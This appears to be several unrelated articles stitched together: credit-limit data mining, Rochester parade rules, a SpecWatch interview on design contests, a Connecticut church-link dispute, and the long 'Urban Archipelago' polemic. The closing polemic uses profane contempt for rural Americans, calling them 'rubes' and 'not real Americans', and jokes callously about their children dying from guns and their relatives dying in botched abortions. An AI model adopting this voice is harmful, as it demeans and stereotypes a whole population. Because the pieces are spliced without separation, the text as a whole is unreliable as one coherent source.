Credit card issuers have said people living in states hard hit by foreclosures , such as Florida , Nevada and California ( referred to as the “ sand states ” ) may be considered increased risks by virtue of the fact that they live there .
People who shop at the same establishments where subprime borrowers shop also may be considered higher risk .
Feddis , the ABA spokeswoman , says decisions to cut credit limits based on customer behavior are based on evidence .
“ They do n’t want to risk a bad judgment that ’s going to lose a good customer .
It ’s too hard to get a good customer , ” Feddis says .
“ They must have some sort of statistics that would demonstrate it ’s predictive — to show that people who shop at pawnshops within six months stop paying their credit card bills . ”
Stephens , the privacy expert , warns of the potential fallout of using purchasing data .
“ One of the dangers of data mining is you ’re getting a little snippet of information that does n’t portray the full picture , ” he says .
Does one purchase at a pawnshop signal a pattern of credit trouble ?
How many purchases qualify ?
Stephens says issuers should make clear disclosures about how they use purchasing data : “ We recognize that most consumers do n’t read privacy policies , but nonetheless , a company that is utilizing data in this fashion ought to make it quite clear that the purchase transaction history is being utilized for purposes other than billing … that they are using it to make re-pricing decisions as well as credit line adjustment decisions . ”

The Rochester St. Patrick ’s Day Parade committee bans participant interaction with crowd , and beads that “ represent a connotation for verbal interactions of a sexually explicit nature . ”
In a letter that caused shock to some Rochester parade goers , the organizers have introduced some regulations that certainly raise an eyebrow .
Among the changes outlined in the document are : “ There will be no interactions between the marching units and parade crowd such as throwing candy / items of any kind , handing out beads / pamphlets , selling items , passing balls back and forth . ”
The committed argues public safety as a high priority for enforcing theses changes , but also adds a specific reason for the reason behind banning bead - giving :
" For example , this is not a Mardi Gras parade where the beads can represent a connotation for verbal interactions of a sexually explicit nature .
Again , this is behavior not suited for a family oriented event honoring the Patron Saint of Ireland and it will not be tolerated . "
The committees also plan to ban alcohol consumption while the parade is taking place , and reduce the parade time to below three hours .
While the majority of these changes have met no opposition , the banning of crowd / participant interaction and the Mardi Gras comparison has upset some locals .
" It takes out the playfulness and interaction between the parade participants and the people there .
It 's horrible , " Clem McGhan , proprietor of McGhan ’s Nearly Famous Pub in Victor , N.Y. told local ABC news channel 13 wham .
McGhan did n’t see any connotation the committee was alluding to with the issue of bead - giving .
“ The kids and the parents were pleading and running out to get the beads .
There 's no mistaking New Orleans for Rochester , New York , " he added .
Carole McGhan - Hicks told 13 wham that it was the human touch that made the Rochester St. Patrick 's Day parade so special .
" People go to the St. Patrick 's Day parade to intermingle with the people marching in the parade , and I think they 're going to be really disappointed , ” she said .

“ Spec work ” stands for speculative work .
It ’s a term used to refer to any job for which the client expects to see examples with no guarantee of payment .
The Internet has accelerated its growth in the form of “ design contest ” websites , and these businesses have advertising machines that draw in thousands of unsuspecting designers who think it ’s normal to give away their intellectual property for nothing .
With the increasing prominence of “ spec work ” businesses , we ’re witnessing more and more about the downsides of the practice , and there ’s one initiative in particular that ’s documenting what goes on — SpecWatch .
David Airey , a well respected graphic designer , has approached WDD with this important issue and we felt it was necessary to bring light to this important subject .
Here ’s the exclusive interview David conducted with SpecWatch for WDD readers .
Designers take note …
Many designers wo n’t be familiar with SpecWatch .
Can you briefly summarize what it is ?
One of the hot topics for the design industry is spec work , repackaged onto website forums and software - driven “ marketplaces ” that use crowd sourcing to host design contests .
Most boast about “ transparency ” .
We decided to take them up on that claim .
How SpecWatch works is this — we monitor design contest sites , blogs and forums for design contests and spec work offerings .
We document some of the more “ interesting ” finds we make and catalog them in giant spreadsheet files .
At random times , depending on the time zone of who ’s lead , we then issue brief summaries of these contests via Twitter , with links back to our website .
We do n’t editorialize .
We generally do n’t comment .
People can read our findings and decide for themselves .
We ’re not about subjective debate on good or bad design .
We do n’t care if contests are an effective way for buyers to obtain cheap design services .
We ’re only about the objective goings on of actual contests .
And whether these contests are a good idea for designers to participate in .
Why the anonymity ?
I ’m sure a lot of folks are curious about who ’s driving .
We are a group of designers and writers , concerned with the effect of spec work and design contests on the graphic design industry and other creative professions , but we did n’t want this debate to be about us .
Nor did we want to become heroes ( or villains depending on your perspective ) .
By making SpecWatch our personally branded project , we would have been criticized for foisting ourselves , or our practices , at the expense of others , a criticism that would n’t be without some validity .
Also , by making SpecWatch our own personal soapbox , we might have been seen as promoting ourselves as a better alternative to buyers and we might have had “ fair use ” complications when it came to using designs and examples from these sites .
When working out the underpinnings of SpecWatch , we also thought about “ monetizing ” the website through Google Adwords , but decided that was n’t a particularly ethical approach either .
If we wanted our message to be “ pure ” we could n’t benefit from it personally , either financially or for whatever “ notoriety ” we ’d achieve in the design community .
Any expenses incurred comes out of our pockets .
Any time spent comes off our clock .
After debating the issue for quite a while ( some were n’t convinced initially and wanted credit ) , SpecWatch as an entity is much more important than any of our individual identities and / or business concerns .
Being anonymous also ensures that we can move about design contest sites unmolested and unchallenged , critical to the accuracy of our reporting .
There are also some pragmatic personal security concerns .
At present , SpecWatch consists of several designers and writers .
Some of us have day - jobs where our participation in SpecWatch activities might not be appreciated by our employers , especially when we ’re challenging some pretty well - financed , high - profile organizations who are n’t opposed to playing rough .
Most design contest sites also have technically proficient people on staff — a concern for a small band of people going up against ALL the design contest sites without their resources .
If people want to attack SpecWatch , they are welcome to challenge anything we post on the Internet .
That ’s fair game .
We ’ve established a set of ground rules for ourselves and one of them is not to make this personal with anyone .
We remove contest holder names .
We remove designers names .
We do n’t even mention the site that we ’re documenting unless it ’s absolutely necessary .
We use Tinyurl.com to remove any potential “ Google bomb ” effect against the sites themselves .
This is n’t personal .
This is about an issue that affects the foundations of the entire design industry .
We could n’t count on our adversaries to follow the same rules , so we removed that option as much as we ’ve been able .
The people that are volunteering for SpecWatch are doing so on their own volition , and we ’re not going to expose anyone to personal attack .
This policy may change in the future , but for the moment , there is no SpecWatch .
Did something in particular happen that led you to start the initiative ?
If there was one thing in particular that helped formulate SpecWatch , it would be a Forbes article on design crowd sourcing and Crowdspring in which people in the design industry were called “ snooty ” for no other crime than expressing an opinion that professional designers should be compensated for their time and efforts .
It seemed like a rather adversarial position to take , while the business model was being presented as the new future of design .
We simply took a look at what that “ promised future ” held for designers , both those practicing now , and those laboring away in various art schools .
The company featured claimed that they welcomed the debate .
Fair enough .
But rather than make SpecWatch about one company , we decided to monitor all design contest sites .
What we found out astonished us .
Abandoned contests .
No winners in a high percentage .
Copied entries , both from other participants , stock sites and unrelated designers .
The amount of abuse heaped on designers by contest holders is breathtaking .
The lack of respect towards designer time by the host companies is phenomenal .
So that people understand our bias , let ’s get our positions out there — is spec work unethical ?
Participating as a designer ?
No .
But we would argue that the companies who are profiting , usually by a percentage of the take , from organized spec work sites are de facto unethical , regardless of what their PR agents tell us via articles and blog posts .
The same goes for buyers that use spec work to take advantage of young , inexperienced or hungry designers in order to obtain cut -rate design services and what one service describes as “ Ridiculous Choices ” .
We found that the discussion about “ ethics ” and “ morals ” often became mired in minutia and carefully scripted challenges .
Some of these services have extraordinarily well - nuanced talking points which they ’ll use in blog comments and articles .
They ’re very , very good at controlling their message .
The one argument that was being overlooked — for what we think are obvious reasons — was actually quite simple ; “ Do design contests work for designers ? ”
Nobody was looking at the actual logistics of logo design contests .
We decided to do that .
What ’s the reason for publishing updates solely on Twitter ?
I ’ve not seen any other websites do likewise .
Have you ?
None that we know of .
Our methodology evolved quite organically .
We originally planned SpecWatch as a Twitter - only initiative .
A lot of these crowd sourcing and design contest companies are heavily active on Twitter , so that seemed like a good spot to start .
We originally registered the SpecWatch domain to protect the name — we figured the initiative would become fairly popular and sniping domain names is attractive for spammers or people who ’d use the domain to masquerade as us .
Then we realized that 140 - odd characters is not enough space to accurately describe what was going on , so the idea of Twitter bulletins linked to website expansions just evolved from there .
The format we ’re using now works well in issuing communiqués while still adhering to the strict guidelines we ’ve given ourselves .
We thought long and hard about adding a blog , or a forum , and decided that neither would work for us .
Unfortunately , many spec work discussions are derailed by pro-spec trolls and bots .
They wish to cloud the discussion with minutia and heart - warming stories of how participating in design contests has been beneficial to them .
While these stories may be true , we do not want to debate the benefit for one or two designers winning a design contest as in our opinion , isolated instances are not germane to how this issue effects the entire graphic design industry .
Others can have that discussion .
We also do n’t want to debate site owners , management or employees , often posing as someone else .
Most site owners ’ comments are merely cut -and - paste astro - turf talking points that long since ceased adding anything to the debate .
We ’re not interested in how good , or bad , the design work obtained through spec work is .
Those discussions are occurring right now , on blogs and forums all over the internet .
Having the same tired , yet often heated , argument is also a distraction from our primary mission – the objective reporting of what ’s actually going on out here .
Cynics will say it ’s just “ sour grapes ” on your behalf .
How do you respond to that ?
We knew that this would be a criticism right form the start .
Design contests , if run as advertised , should be able to stand up to scrutiny and we ’d have nothing to write about .
If they do n’t stand up to scrutiny , then there is an issue with crowd sourcing and design contests as they pertain to designers .
Simply cataloging a timeline of events in a publicly accessible contest is not picking on anyone or a case of “ sour grapes ” .
This potential criticism is also one of the main reasons we could n’t be seen as benefiting personally or financially from SpecWatch .
It ’s why we took the “ no editorializing ” approach to our reporting methods .
This is n’t about our opinion or “ whining ” .
But even if SpecWatch IS the largest case of “ sour grapes ” in history , we defy anyone to take a look at our postings and claim that these design contest sites and the proliferation of spec work is good for designers .
We see designers getting routinely taken advantage of , often promised things that never materialize .
One of our “ contest watchers ” is n’t even a designer but from a related field that ’s been placed in the target sights of a high - profile spec work “ marketplace ” .
They ’re fearful for their future and can see the parallel with what ’s happening with graphic design .
We ’d also point out that we ’ve even helped designers participating on spec design contests to obtain what they were promised in the first place .
While we were initially cataloguing spec sites , we found lots of abandoned and forgotten contests — even when a prize was supposedly guaranteed according to site TOS — that were very quickly paid out once pointed out by our Twitter communiqués .
At the very least , we made sure that a few participating designers were selected and paid , something which most of the design contests sites neglect to do on a far - too - frequent basis .
We ’re not trying to sabotage design contest sites , their contests , designers or buyers .
If SpecWatch has had any effect , it ’s been to encourage spec site owners , at the very least , to enforce their own rules and promises that have been used to lure designers to their “ communities ” .
Several have thanked us openly on Twitter for helping them “ improve ” their business models , and have even commented that they “ appreciate ” what we ’re doing .
Designers who are active on design contest sites agree with our basic premise — designers should get paid for their work when that work is being requested by professional entities .
We understand that spec work and design contest sites are here to stay .
As competition heats up , more design contest sites will come online , and these services are going to become less beneficial to designers as the services have to charge less , promise more and be less restrictive on what contest holders can get away with , something which they ’re quite liberal with as it is .
We ’re of the belief that spec design sites , if they ’re going to avail themselves of free work from designers , need to be exceptionally good stewards of those efforts .
So far they have n’t been .
If SpecWatch can help them “ see the light ” , that ’s good .
And hardly a case of “ sour grapes ” .
It seems you know a lot about how designers are treated on “ spec websites ” .
Is there a specific statistic you ’ve uncovered that surprises you more than most ?
We issued several SpecWatch communiques for which we took actual figures from several spec websites , and performed some basic primary - school arithmetic .
We found the raw numbers astonishing .
The amount of unpaid designer labor being submitted to these sites has a real world value that ’s in the tens of millions of dollars .
And those are conservative estimates .
The number of designers who are n’t making a penny , while entering dozens of contests , is in the tens of thousands , and you just need to look at the astonishing raw numbers for Crowdspring and 99designs to see for yourself .
Wasted time , in terms of unpaid designs submitted , is , quite literally , in the hundreds of years .
Yes , that ’s hundreds .
In terms of overall conclusions , we do n’t want to get into specifics , but let ’s say there ’s several main “ spec websites ” that we ’ve been monitoring for several months .
One gives the appearance of trying to do the right thing , at least on the surface .
Trouble is , the scope of their community and the nature of spec work combined with anonymous designers and lack of project management make it impossible for them to do so .
Their service is teetering into the usual free - for - all territory .
Another is already a full - blown designer free - for - all , no project management , an incredible amount of design plagiarism and copying .
Things have become so bad that they started “ locking ” contests .
We suspect this is n’t , as claimed , to protect their participants IP property , but instead to cover up the out - of - control nature of their contests , especially what goes on in the comment sections .
They do n’t “ lock ” design contests that end “ successfully ” and the designers that participated see their work and IP exposed .
Another is breathtakingly dishonest , carrying on in a way that is tantamount to fraud .
Another , in start - up , even seems to be hosting bogus contests , with non-existent designers and made - up clients , in order to attract buyers and participants to their new website .
On all the sites we ’ve monitored , whatever “ protections ” that are in place are usually to protect the host company and website themselves , while designers are thrown to the wolves .
The lack of buyer feedback — the only other reason , other than pay , that all design contest sites claim is an advantage to participating — is stunning .
Overall , what truly amazes us is the amount of abuse designers are willing to endure , and the amount of time they ’re willing to donate to another company ’s bottom line while being cheated , copied and treated like chattel .
It ’s a sad development in the design industry and community .
While it ’s highly unlikely SpecWatch will even make a dent in the rise of spec design sites — a couple are in start - up , there are several in BETA — at the very least we can help shed some light on the dark side to these services , the risks involved and the actual pitfalls of participating .
If we can help one designer avoid burning out before having a chance at a decent career in design , our efforts will have been worth it .
David Airey :
Those familiar with my own blog posts will know I have a strong stance against spec websites , and the most common explanation I hear from designers who participate is that they want to build their portfolio .
How about trying this instead ?
Approach local non-profits and offer them your skills , free of charge .
The experience gained will be so much greater than working on a spec website — you ’re improving your face - to - face customer skills , giving back to the local community , networking with business owners , and standing a much greater chance of actually seeing your work used ( excellent for your portfolio ) .
You ’ll learn about your chosen profession much faster too .

Know what ’s harmful for struggling families in Connecticut ?
Learning which places of worship might be welcoming to the gays !
Connecticut ’s Department of Children and Families pulled from its website links to gay - friendly churches after a complaint was lodged “ over the separation of church and state . ”
And who submitted that complaint ?
That would be the Family Institute of Connecticut , an organization that — as if you have to guess — supports amending the state and federal constitution to ban same - sex marriage .
( In its complaint , FIC was represented by Pat Robertson ’s American Center for Law and Justice . )
Says FIC ’s executive director Peter Wolfgang : “ We said all along that if same - sex marriage was imposed in Connecticut , the next thing that would happen would be an effort to re-educate Connecticut children .
That ’s what today ’s victory was all about : making sure they do n’t try and re-indoctrinate children into accepting lifestyles and beliefs that their parents are utterly opposed to . ”
We took a look around the DCF website and could n’t find links to other churches ( read : non -gay - friendly ) , so it appears the agency is at least uniform in its policies .
The site still has a link to the Gay , Lesbian , Bisexual and Transgender National Youth Talkline .
But if DCF is going to to yank gay - friendly organizations — under the guise of keeping church and state separate — should n’t they review the link to the Boy Scouts of America , which actively discriminates against gays ?
( At least there ’s no link to the gay demon exorcism church Manifested Glory Ministries in Bridgeport . )
Meanwhile , since DCF wo n’t do it , here ’s a great reference for Connecticut families who do want a church that ’s welcoming to everyone .
But we ’re still on the fence :
We certainly want families to have as much information at their disposal about support services , but do we draw the line at faith ?
If the DCF website linked to anti-gay churches , would we be calling for those to be pulled ?
Is linking to a church website a
tacit endorsement of the faith , or merely providing a resource ?
And can a couple hyperlinks qualify as using taxpayer dollars to cross the church - state line ?
( Thanks , PS ! )
The Urban Archipelago It 's the Cities , Stupid
There are two maps on this page .
The one at the top should be familiar .
It 's one of those red -state / blue - state maps that have been tormenting Democrats , liberals , and progressives since November of 2000 .
Over the 36 days that George W. Bush and Al Gore fought for the White House in Florida , " red " and " blue " became metaphors for America 's divided electorate .
Red vs. Blue -- Democrat vs. Republican ; liberal vs. conservative ; pro-life vs. pro-choice ; gun-huggers vs. gun-haters ; gay - huggers vs. gay - haters .
The red -state / blue - state map opposite shows the results of 2004's presidential election - - red states won by George W. Bush , blue states won by John F. Kerry .
But the red - state / blue - state map is misleading .
If a Republican presidential candidate takes 50 percent of the vote plus 1 vote in any given state , the whole state is colored red ( even worse , a mere plurality of voters can turn a state red when third parties are involved ) .
The same goes for the Democratic candidate -- corral the most votes , and the whole state is colored blue .
But painting an entire state one color or the other creates a false impression , an impression that we believe is hampering the Democratic Party 's efforts to pull itself out of its tailspin .
Take a look at the second map on the opposite page .
This map shows a county - by - county red / blue breakdown , and it provides a clearer picture of the bind the Democrats finds themselves in .
The majority of the blue states -- Washington , Oregon , California , Illinois , Minnesota , Michigan , Pennsylvania , New York , New Jersey , Delaware - - are , geographically speaking , not blue states .
They are blue cities .
Look at our famously blue West Coast .
But for the cities -- Seattle , Portland , San Francisco , Los Angeles , and San Diego -- the West Coast would be a deep , dark red .
The same is true for other nominally blue states .
Illinois is almost entirely red--Chicago turns the state blue .
Michigan is almost entirely red--Detroit , Lansing , Kalamazoo turn it blue .
And on and on .
What tips these states into the blue column ?
Their urban areas do , their big , populous counties .
It 's time for the Democrats to face reality :
They are the party of urban America .
If the cities elected our president , if urban voters determined the outcome , John F. Kerry would have won by a landslide .
Urban voters are the Democratic base .
THE URBAN ARCHIPELAGO
It 's time to state something that we 've felt for a long time but have been too polite to say out loud : Liberals , progressives , and Democrats do not live in a country that stretches from the Atlantic to the Pacific , from Canada to Mexico .
We live on a chain of islands .
We are citizens of the Urban Archipelago , the United Cities of America .
We live on islands of sanity , liberalism , and compassion -- New York City , Chicago , Philadelphia , Seattle , St. Louis , Minneapolis , San Francisco , and on and on .
And we live on islands in red states too -- a fact obscured by that state - by - state map .
Denver and Boulder are our islands in Colorado ; Austin is our island in Texas ; Las Vegas is our island in Nevada ; Miami and Fort Lauderdale are our islands in Florida .
Citizens of the Urban Archipelago reject heartland " values " like xenophobia , sexism , racism , and homophobia , as well as the more intolerant strains of Christianity that have taken root in this country .
And we are the real Americans .
They - - rural , red - state voters , the denizens of the exurbs - - are not real Americans .
They are rubes , fools , and hate - mongers .
Red Virginia prohibits any contract between same - sex couples .
Compassionate ?
Texas allows the death penalty to be applied to teenaged criminals and has historically executed the mentally retarded .
( When the Supreme Court ruled executions of the mentally retarded unconstitutional in 2002 , Texas officials , including Governor Rick Perry , responded by claiming that the state had no mentally retarded inmates on death row -- a claim the state was able to make because it does not test inmates for mental retardation . )
Dumb ?
The Sierra Club has reported that Arkansas , Mississippi , Oklahoma , Alabama , and Tennessee squander over half of their federal transportation money on building new roads rather than public transit .
If Democrats and urban residents want to combat the rising tide of red that threatens to swamp and ruin this country , we need a new identity politics , an urban identity politics , one that argues for the cities , uses a rhetoric of urban values , and creates a tribal identity for liberals that 's as powerful and attractive as the tribal identity Republicans have created for their constituents .
John Kerry won among the highly educated , Jews , young people , gays and lesbians , and non-whites .
What do all these groups have in common ?
They choose to live in cities .
An overwhelming majority of the American popuation chooses to live in cities .
And John Kerry won every city with a population above 500,000 .
He took half the cities with populations between 50,000 and 500,000 .
The future success of liberalism is tied to winning the cities .
An urbanist agenda may not be a recipe for winning the next presidential election -- but it may win the Democrats the presidential election in 2012 and create a new Democratic majority .
For Democrats , it 's the cities , stupid -- not the rural areas , not the prickly , hateful " heartland , " but the sane , sensible cities -- including the cities trapped in the heartland .
Pandering to rural voters is a waste of time .
Again , look at the second map .
Look at the urban blue spots in red states like Iowa , Colorado , and New Mexico - - there 's almost as much blue in those states as there is in Washington , Oregon , and California .
And the challenge for the Democrats is not just to organize in the blue areas but to grow them .
And to do that , Democrats need to pursue policies that encourage urban growth ( mass transit , affordable housing , city services ) , and Democrats need to openly and aggressively champion urban values .
By focusing on the cities the Dems can create a tribal identity to combat the white , Christian , rural , and suburban identity that the Republicans have cornered .
And it 's sitting right there , on every electoral map , staring them in the face :
The cities .
The urbanites .
Howard Dean had it wrong when he tried to woo the " Pickup Truck with Confederate Flag " vote .
In fact , while Kerry won urban areas by a whopping 60 percent -- that actually represents a 15 percent drop in urban support from 2000 when Gore won the election .
The lesson ?
Democrats have got to tend to their urban base and grow it .
In cities all over America , distressed liberals are talking about fleeing to Canada or , better yet , seceding from the Union .
We can't literally secede and , let 's admit it , we do n't really want to live in Canada .
It 's too cold up there and in our heart - of - hearts we hate hockey .
We can secede emotionally , however , by turning our backs on the heartland .
We can focus on our issues , our urban issues , and promote our shared urban values .
We can create a new identity politics , one that transcends class , race , sexual orientation , and religion , one that unites people living in cities with each other and with other urbanites in other cities .
The Republicans have the federal government - - for now .
But we 've got Seattle , Portland , San Francisco , Chicago , Los Angeles , San Diego , New York City ( Bloomberg is a Republican in name only ) , and every college town in the country .
We 're everywhere any sane person wants to be .
Let them have the shitholes , the Oklahomas , Wyomings , and Alabamas .
We 'll take Manhattan .
EMBRACING URBAN SELF -INTEREST
To all those who live in cities -- to all those depressed Kerry supporters out there -- we say take heart .
Clearly we can't control national politics right now -- we can barely get a hearing .
We can , however , stay engaged in our cities , and make our voices heard in the urban areas we dominate , and make each and every one , to quote Ronald Reagan ( and John Winthrop , the 17th - century Puritan Reagan was parroting ) , " a city on a hill . "
This is not a retreat ; it is a long - term strategy for the Democratic Party to cater to and build on its base .
To red - state voters , to the rural voters , residents of small , dying towns , and soulless sprawling exburbs , we say this : Fuck off .
Your issues are no longer our issues .
We 're going to battle our bleeding - heart instincts and ignore pangs of misplaced empathy .
We will no longer concern ourselves with a health care crisis that disproportionately impacts rural areas .
Instead we will work toward winning health care one blue state at a time .
When it comes to the environment , our new policy is this :
Let the heartland live with the consequences of handing the national government to the rape - and - pillage party .
The only time urbanists should concern themselves with the environment is when we are impacted -- directly , not spiritually ( the depressing awareness that there is no unspoiled wilderness out there does n't count ) .
Air pollution , for instance :
We should be aggressive .
If coal is to be burned , it has to be burned as cleanly as possible so as not to foul the air we all have to breathe .
But if West Virginia wants to elect politicians who allow mining companies to lop off the tops off mountains and dump the waste into valleys and streams , thus causing floods that destroy the homes of the yokels who vote for those politicians , it no longer matters to us .
Fuck the mountains in West Virginia -- send us the power generated by cleanly burned coal , you rubes , and be sure to wear lifejackets to bed .
Wal - Mart is a rapacious corporation that pays sub-poverty - level wages , offers health benefits to its employees that are so expensive few can afford them , and destroys small towns and rural jobs .
Liberals in big cities who have never seen the inside of a Wal - Mart spend a lot of time worrying about the impact Wal - Mart is having on the heartland .
No more .
We will do what we can to keep Wal - Mart out of our cities and , if at all possible , out of our states .
We will pass laws mandating a living wage for full - time work , upping the minimum wage for part - time work , and requiring large corporations to either offer health benefits or pay into state - or city - run funds to provide health care for uninsured workers .
That will reform Wal - Mart in our blue cities and states or , better yet , keep Wal - Mart out entirely .
And when we see something on the front page of the national section of the New York Times about the damage Wal - Mart is doing to the heartland , we will turn the page .
Wal - Mart is not an urban issue .
Neither is gun control .
Our new position :
We 'll fight to keep guns off the streets of our cities , but the more guns lying around out there in the heartland , the better .
Most cities have strong gun-control laws -- laws that are , of course , undermined by the fact that our cities are n't walled .
Yet .
But why should liberals in cities fund organizations that attempt , to take one example , to get trigger locks onto the handguns of NRA members out there in red states ?
If red - state dads are n't concerned enough about their own children to put trigger locks on their own guns , it 's not our problem .
If a kid in a red state finds his daddy 's handgun and blows his head off , we 'll feel terrible ( we 're like that ) , but we 'll try to look on the bright side :
At least he wo n't grow up to vote like his dad .
We wo n't demand that the federal government impose reasonable fuel - efficiency standards on all cars sold in the United States .
We will , however , strive to pass state laws , as California has done , imposing fuel - efficiency standards on cars sold in our states .
We officially no longer give a shit when family farms fail .
Fewer family farms equal fewer rural voters .
We will , however , continue to support small faggy organic farms , as we are willing to pay more for free - range chicken and beef from non-cannibal cows .
We wo n't concern ourselves if red states restrict choice .
We 'll just make sure that abortion remains safe and legal in the cities where we live , and the states we control , and when your daughter or sister or mother dies in a botched abortion , we 'll try not to feel too awful about it .
In short , we 're through with you people .
We 're going to demand that the Democrats focus on building their party in the cities while at the same time advancing a smart urban - growth agenda that builds the cities themselves .
The more attractive we make the cities -- politically , aesthetically , socially -- the more residents and voters cities will attract , gradually increasing the electoral clout of liberals and progressives .
For Democrats , party building and city building is the same thing .
We will strive to turn red states blue one city at a time .
From here on out , we 're glad red - state rubes live in areas where guns are more powerful and more plentiful , cars are larger and faster , and people are fatter and slower and dumber .
This is not a recipe for repopulating the Great Plains .
And when you look for ways to revive your failing towns and dying rural counties , do n't even think about tourism .
Who wants to go to small - town America now ?
You people scare us .
We 'll island - hop from now on , thank you , spending our time and our money in blue cities .
If an urbanite is dying to have a country experience , rural Vermont is lovely .
Maple syrup , rolling hills , fly - fishing -- everything you could want .
Country bumpkins in red rural areas who depend on tourists from urban areas but vote Republican can forget our money .
You 've made your choice , red America , and we urban Americans are going to make a different choice .
We are going to make Seattle -- and New York , Chicago , and the rest - - a great place to live , a progressive place .
Again , we 'll quote Ronald Reagan :
We will make each of our cities -- each and every one - - a shining city on a hill .
You can have your shitholes .
URBAN VISION
The first president Bush had a problem with the " vision thing , " and he lost .
Democrats had a problem with vision thing in 2004 , and they lost .
But they do n't have to continue having this problem .
Above any other advantage , the new urban identity politics solves " the vision thing " for the Democratic Party .
No longer are we a fractured aggregation of special interests or a spineless hydra of contingent alliances -- we are a united front , with a clear , compelling image and an articulated system of values .
Up until now , the Republicans have been winning the image war .
When you think of " America , " you imagine a single - family dwelling with a flag in the front yard and acres of corn waving in the background .
It 's an angry red fantasy .
But propaganda is flexible , and audiences are pliant .
Urban politics opens up a whole new visual vocabulary to be exploited by TV advertising , and it's a vocabulary rich in emotional content , particularly after September 11 .
This is the era of cityscapes , rapid transit , and crowds of people .
Political advertising can no longer pander to nostalgia about the yeoman countryside -- we must embrace our urban future .
With all the talk of the growth of exurbs and the hand - wringing over facile demographic categories like " security moms , " you may be under the impression that an urban politics would n't speak to many people .
But according to the 2000 Census , 226 million people reside inside metropolitan areas -- a number that positively dwarfs the 55 million people who live outside metro areas .
The 85 million people who live in strictly defined central city limits also outnumber those rural relics .
When the number of city - dwellers in the United States is quadruple the number of rural people , we can put simple democratic majorities to work for our ideals .
Even people who do n't live in cities look to urban centers for a certain image of America .
The nation identified with New York City in such a visceral way on September 11 not just because Americans died there -- Americans died in a Pennsylvania field and in Northern Virginia too -- but because the New York skyline is a stirring image of American prosperity and achievement .
It symbolizes the motivation and spirit of the American people , the wealth of our nation , the thrum of diverse cultures , and inexhaustible cultural creativity .
Cities inspire us ; they speak to our hopes and our passions .
Small towns diminish us ; they speak of lost history and downscaled dreams .
The Democratic Party should compete on our own turf , change the terms of the debate , and give the American people heroes to believe in -- as well as enemies to revile .
Conservatives have vilified liberals for decades , and the new urban identity politics gives the Democratic Party its own partisan villains .
The truth is that rural states -- the same red states that vote reflexively Republican in national elections -- are welfare states .
While red -state voters like to complain about " tax - and - spend liberals , " red states are hopelessly dependent on the largess of the federal government to prop up their dwindling rural population .
Red states like North Dakota , New Mexico , Mississippi , Alaska , West Virginia , Montana , Alabama , South Dakota , and Arkansas top the list of federal spending per dollar of federal taxes paid .
And who 's paying the most ?
Blue states .
Cities -- and states dominated by their cities .
Welfare states , in contrast , demand federal money to fund wasteful roads to nowhere .
Welfare states guzzle barrel upon barrel of oil so their rural residents can sputter along on ribbons of asphalt .
Take a state like Wyoming , the arid , under - populated home of our glowering vice president Dick Cheney .
Wyoming receives the second - highest amount of federal aid in the nation per capita ( Alaska , another red state , is number one ) , and it ranks second lowest in federal taxes paid ( behind only South Dakota ) .
Overall , the federal government spent about $ 2,413 per capita in Wyoming for the fiscal year 2002 ( the last year for which data is available ) , compared with almost exactly half that amount , or $ 1,205 per capita , for Washington State .
This ridiculous disparity extends even to Homeland Security funds , which ought to be targeted toward the most vulnerable areas -- coastlines , big city landmarks , porous borders .
But landlocked Wyoming , with exactly zero important strategic targets , merits $ 38.31 per capita in Homeland Security funds .
New York state residents get a measly $ 5.47 .
An urban agenda would argue for kicking Wyoming off the federal dole .
States should pay their own way , not come to cities begging for handouts .
A refusal to subsidize rural waste will inform other policy decisions as well .
Farm subsidies , for example , are obsolete and they cause needless friction in international trade agreements .
The agricultural complex in the United States is so concentrated that very few voters have a personal stake in the continued existence of farm subsidies .
Rural voters are n't going to switch party affiliations no matter what we do , so let 's jettison their issues when they fail to serve our core interests .
Ethanol , a corn-derived alcohol , is another great example .
Scientific consensus says that corn will never be a viable source for alternative fuel , since the very production of ethanol requires so much fossil fuel and the payoff is paltry .
Ethanol is vanity research ; the new urban politics should stand for real solutions .
In the same way , we need to claim legislation like the Clean Air Act as our own .
It is urban residents , not rural residents , who suffer when air quality is poor , and coal mines in rural states cannot dictate what size airborne particulates we should be willing to breathe .
Asthma is a growing problem across the nation , but it is particularly acute among African American and Latino children growing up in the inner cities -- the death rate from asthma complications is three times as high for minority children as it is for whites .
This is unacceptable , and it's just one example of an issue urban residents can and should rally behind .
Democrats are now emphatically the minority party .
This does n't mean we give up ; it means we take a page from the Republican playbook , refining and relentlessly pushing a vision of our own .
We must rededicate ourselves to the urban core .
URBAN INDEPENDENCE
The anti-urban vote does more than just overwhelm city voters in presidential elections .
It also overruns city priorities on local policy debates .
We should go our own way .
After all , when a city like Seattle 's fate is tied to that of a state like Washington , the city 's interests are routinely routed .
In 1993 , for example , Washington voters limited state budget increases , hobbling education and transportation funding .
The measure , which passed statewide by a 51 to 49 margin , tanked in Seattle , 46 to 54 .
A 1997 gay rights measure , meanwhile , suffered the converse fate , losing statewide while winning here .
And Tim Eyman 's two tax - slashing initiatives won in rural and suburban areas but went down in flames inside city limits .
Laws limiting taxes have a disproportionate impact on cities , which rely on local levies to pay for basic social and human services like domestic - violence programs , low - income housing , and tenant advocacy .
If you 're wondering why the city is suffering draconian budget cuts --$ 24 million this year , $ 20 million in 2005 - - you can thank rural voters who seem unable to grasp a basic Christian tenet ; greed is bad , sharing is good .
The lesson is simple for urban residents : Seattle should n't cast its lot with the rest of the state .
Rural and suburban voters have shown again and again that they are n't willing to fund urban infrastructure .
Throughout Washington State , transportation taxes like 2002's Referendum 51 have tanked , while anti-transit measures like Tim Eyman 's I -776 have passed overwhelmingly .
While that might seem like grim news for cities like Seattle , there 's a silver lining :
When cities set their own transportation priorities , truly urban systems ( like the monorail ) get funded and built , while the suburban mega - highways that lard initiatives like R - 51 go unfunded .
We do n't use suburban roads .
We can let the suburbs figure out a way to pay for them .
Cities have the clout , and the imperative , to give people alternatives to driving solo , and to punish those who insist on clogging our city streets .
In Seattle , we 've done exactly that .
We 've built bike lanes , expanded the bus system , and banned new park - and - rides inside city limits .
We 've funded a South Seattle - to - downtown light rail system .
And we 've overwhelmingly supported the monorail , an inner-city mass - transit system that 's paid for by one of the most progressive taxes available : an excise tax on the value of cars in the city .
Want to buy a Hummer ?
Fine .
But you 're gonna pay for it -- and help fund public transit .
If you want to rely on environmentally friendly public transit , though , we 'll make it affordable and easy to use .
That 's a truly urban value .
Transit like the monorail , in turn , promotes density in outlying areas ( like Ballard and West Seattle ) , which leads to the creation of housing that 's affordable to everyone -- not just the proverbial penthouse - dwelling downtown urban elite .
Cities like Seattle can further encourage dense urban housing by adopting policies that encourage developers to build dense low - income housing .
